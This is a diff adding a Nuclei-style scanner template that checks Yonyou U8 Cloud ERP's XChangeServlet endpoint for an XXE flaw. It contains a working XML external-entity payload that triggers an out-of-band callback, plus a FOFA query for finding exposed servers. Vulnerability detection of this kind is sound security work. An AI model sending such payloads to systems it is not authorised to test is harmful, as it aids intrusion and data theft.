@@ -1,0 +1,38 @@
+http:
+- matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - http
+  raw:
+  - 'POST /service/XChangeServlet HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: text/xml
+
+
+    <!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "http://{{interactsh-url}}">]><r><a>&xxe;</a></r>
+
+    '
+id: yonyou-u8-cloud-xchangeservlet-xxe
+info:
+  author: Co5mos
+  description: "\u7528\u53CBU8 cloud \u805A\u7126\u6210\u957F\u578B\u3001\u521B\u65B0\
+    \u578B\u4F01\u4E1A\u7684\u4E91 ERP\uFF0C\u57FA\u4E8E\u5168\u65B0\u7684\u4F01\u4E1A\
+    \u4E92\u8054\u7F51\u5E94\u7528\u8BBE\u8BA1\u7406\u5FF5\uFF0C\u4E3A\u4F01\u4E1A\
+    \u63D0\u4F9B\u96C6\u4EBA\u8D22\u7269\u5BA2\u3001\u4EA7\u4F9B\u9500\u4E8E\u4E00\
+    \u4F53\u7684\u4E91 ERP \u6574\u4F53\u89E3\u51B3\u65B9\u6848\uFF0C\u5168\u9762\u652F\
+    \u6301\u591A\u7EC4\u7EC7\u4E1A\u52A1\u534F\u540C\u3001\u667A\u80FD\u8D22\u52A1\
+    \uFF0C\u4EBA\u529B\u670D\u52A1\u3001\u6784\u5EFA\u4EA7\u4E1A\u94FE\u667A\u9020\
+    \u5E73\u53F0\uFF0C\u878D\u5408\u7528\u53CB\u4E91\u670D\u52A1\u5B9E\u73B0\u4F01\
+    \u4E1A\u4E92\u8054\u7F51\u8D44\u6E90\u8FDE\u63A5\u3001\u5171\u4EAB\u3001\u534F\
+    \u540C\u3002\u8BE5\u7CFB\u7EDF/service/XChangeServlet\u63A5\u53E3\u5B58\u5728\
+    XXE\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u53EF\u4EE5\u5728xml\u4E2D\u6784\u9020\
+    \u6076\u610F\u547D\u4EE4\uFF0C\u4F1A\u5BFC\u81F4\u670D\u52A1\u5668\u6570\u636E\
+    \u6CC4\u9732\u4EE5\u53CA\u88AB\u8FDC\u63A7\u3002\n"
+  metadata:
+    fofa-query: "app=\"\u7528\u53CB-U8-Cloud\""
+  name: "\u7528\u53CBU8-Cloud\u7CFB\u7EDFXChangeServlet\u63A5\u53E3XXE\u6F0F\u6D1E"
+  severity: high
+  tags: xxe,u8cloud,yonyou
